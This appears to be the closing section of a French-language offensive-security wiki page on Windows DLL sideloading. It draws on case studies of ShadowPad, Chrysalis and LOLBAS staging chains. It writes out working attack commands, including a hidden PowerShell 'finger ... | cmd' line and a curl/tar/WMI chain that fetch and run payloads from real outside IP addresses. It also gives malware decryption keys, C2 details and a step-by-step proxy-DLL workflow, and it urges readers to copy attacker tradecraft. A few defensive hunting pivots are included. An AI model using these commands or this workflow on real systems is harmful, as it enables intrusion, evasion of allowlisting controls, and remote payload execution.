- Cette technique repose sur la résolution du nom de la DLL par le binary hôte. Si l'hôte utilise des chemins absolus ou des safe loading flags (par exemple, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS, et les forwarded exports peuvent influencer la precedence et doivent être pris en compte lors de la sélection du binary hôte et du set d'exports.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant un **three-file triad** pour se fondre dans un logiciel légitime tout en gardant le core payload chiffré sur le disque :

1. **Signed host EXE** – des vendors comme AMD, Realtek ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attackers renommant l'executable pour lui faire ressembler à un binary Windows (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposée à côté de l'EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un binary MFC obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, de le déchiffrer et de mapper ShadowPad de manière reflective.
3. **Encrypted payload blob** – souvent stocké comme `<name>.tmp` dans le même répertoire. Après le memory-mapping du payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensic.

Notes de tradecraft :

* Renommer l'EXE signé (tout en conservant le `OriginalFileName` d'origine dans le PE header) lui permet de se faire passer pour un binary Windows tout en gardant la signature du vendor, donc reproduisez l'habitude d'Ink Dragon de déposer des binaries ressemblant à `conhost.exe` mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l'executable reste trusted, la plupart des controls d'allowlisting n'ont besoin que de votre DLL malveillante à côté de lui. Concentrez-vous sur la personnalisation de la loader DLL ; le parent signé peut généralement fonctionner sans modification.
* Le decryptor de ShadowPad attend que le blob TMP se trouve à côté du loader et qu'il soit writable afin qu'il puisse mettre le fichier à zéro après le mapping. Gardez le répertoire writable jusqu'au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé en toute sécurité pour l'OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Les operators associent le DLL sideloading à LOLBAS afin que le seul artifact custom sur le disque soit la DLL malveillante à côté de l'EXE trusted :

- **Remote command loader (Finger):** Hidden PowerShell lance `cmd.exe /c`, récupère les commandes depuis un Finger server et les pipe vers `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte TCP/79 ; `| cmd` exécute la réponse du serveur, ce qui permet aux operators de faire tourner le second stage côté serveur.

- **Built-in download/extract:** Téléchargez une archive avec une extension bénigne, décompressez-la et préparez la cible du sideload ainsi que la DLL dans un dossier aléatoire `%LocalAppData%` :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré à Windows.

- **WMI/CIM launch:** Démarrez l'EXE via WMI pour que la telemetry montre un processus créé par CIM pendant qu'il charge la DLL colocated :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec des binaries qui préfèrent les DLL locales (par exemple, `intelbq.exe`, `nearby_share.exe`) ; le payload (par exemple, Remcos) s'exécute sous le nom trusted.

- **Hunting:** Déclenchez une alerte sur `forfiles` lorsque `/p`, `/m` et `/c` apparaissent ensemble ; c'est rare en dehors des scripts d'administration.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d'une chaîne de mise à jour trusted pour livrer un dropper packé en NSIS qui a préparé un DLL sideload ainsi que des payloads entièrement en mémoire.

Tradecraft flow
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un `BluetoothService.exe` renommé depuis Bitdefender Submission Wizard, un `log.dll` malveillant et un blob chiffré `BluetoothService`, puis lance l'EXE.
- Le host EXE importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob via mmap ; `LogWrite` le déchiffre avec un stream custom basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, key material dérivé d'un hash précédent), écrase le buffer avec le shellcode en clair, libère les temporaires et saute dessus.
- Pour éviter une IAT, le loader résout les APIs en hachant les noms d'export avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis en appliquant un avalanche de style Murmur (**0x85EBCA6B**) et en comparant avec des salted target hashes.

Main shellcode (Chrysalis)
- Déchiffre un main module de type PE en répétant add/XOR/sub avec la key `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour finir la résolution des imports.
- Reconstruit les chaînes de nom des DLL au runtime via des transforms bit-rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, analyse chaque export table en blocs de 4 bytes avec un Murmur-style mixing, et ne revient vers `GetProcAddress` que si le hash n'est pas trouvé.

Embedded configuration & C2
- La config se trouve dans le fichier `BluetoothService` déposé à l'**offset 0x30808** (taille **0x980**) et est déchiffrée en RC4 avec la key `qwhvb^435h&*7`, révélant l'URL C2 et le User-Agent.
- Les beacons construisent un host profile séparé par des points, préfixent le tag `4Q`, puis chiffrent en RC4 avec la key `vAuig34%^325hGV` avant `HttpSendRequestA` en HTTPS. Les réponses sont déchiffrées en RC4 et dispatchées par un switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Le mode d'execution est contrôlé par les arguments CLI : sans args = install de la persistence (service/Run key) pointant vers `-i` ; `-i` relance lui-même avec `-k` ; `-k` saute l'installation et exécute le payload.

Alternate loader observed
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. Le source C fourni par l'attaquant embarquait du shellcode, le compilait et l'exécutait en mémoire sans toucher le disque avec un PE. Reproduisez avec :
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape de compile-and-run basée sur TCC a importé `Wininet.dll` au runtime et a récupéré un second-stage shellcode depuis une URL codée en dur, offrant un loader flexible qui se faisait passer pour une exécution de compilateur.

## Signed-host sideloading avec export proxying + host thread parking

Certaines chaînes de DLL sideloading ajoutent une **stability engineering** afin que le host légitime reste actif assez longtemps pour charger proprement les stages suivants au lieu de crasher après le chargement de la DLL malveillante.

Schéma observé
- Déposer un EXE de confiance à côté d’une DLL malveillante en utilisant le nom de dépendance attendu, comme `version.dll`.
- La DLL malveillante **proxy chaque export attendu** vers la vraie DLL système (par exemple `%SystemRoot%\\System32\\version.dll`) afin que la résolution des imports réussisse toujours et que le process hôte continue de fonctionner.
- Après le chargement, la DLL malveillante **patch le point d’entrée du host** afin que le main thread tombe dans une boucle `Sleep` infinie au lieu de quitter ou d’exécuter des chemins de code qui termineraient le process.
- Un nouveau thread effectue le vrai travail malveillant : déchiffrer le nom ou le chemin de la DLL du next-stage (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying DLL normal préserve la compatibilité API, mais ne garantit pas que le host reste actif assez longtemps pour les stages ultérieurs.
- Mettre le main thread en `Sleep(INFINITE)` est une manière simple de garder le process signé résident pendant que le loader effectue le déchiffrement, le staging ou l’initialisation réseau dans un worker thread.
- Chercher uniquement un `DllMain` suspect peut manquer ce schéma si le comportement intéressant se produit après le patch du point d’entrée du host et le démarrage d’un thread secondaire.

Workflow minimal
1. Copier l’EXE host signé et déterminer la DLL qu’il résout depuis le répertoire local.
2. Construire une DLL proxy exportant les mêmes fonctions et les redirigeant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un worker thread.
4. Depuis ce thread, patcher le point d’entrée du host ou la routine de démarrage du main thread pour qu’elle boucle sur `Sleep`.
5. Déchiffrer le nom/config de la DLL du next-stage et appeler `LoadLibrary` ou faire un manual-map du payload.

Pivots défensifs
- Des process signés chargeant `version.dll` ou des bibliothèques courantes similaires depuis leur propre répertoire applicatif plutôt que depuis `System32`.
- Des patchs mémoire au point d’entrée du process juste après le chargement de l’image, en particulier des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Des threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une seconde DLL avec un nom déchiffré.
- Des DLL proxy à exports complets placées à côté d’exécutables de fournisseurs dans des répertoires de staging inscriptibles tels que `ProgramData`, `%TEMP%`, ou des chemins d’archives décompressées.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
